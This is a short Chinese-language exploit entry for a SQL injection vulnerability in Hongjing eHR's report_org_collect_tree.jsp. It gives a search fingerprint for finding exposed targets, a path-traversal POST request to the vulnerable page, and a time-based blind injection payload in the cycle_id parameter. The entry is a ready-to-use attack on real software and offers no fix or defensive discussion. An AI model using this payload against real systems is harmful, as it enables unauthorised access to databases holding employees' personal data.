# 宏景eHR-report_org_collect_tree.jsp存在SQL注入漏洞

宏景 ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1`

**Payload**
```
params=&isAction=2&cycle_id=2;waitfor%20delay%20'0:0:5'--%20
```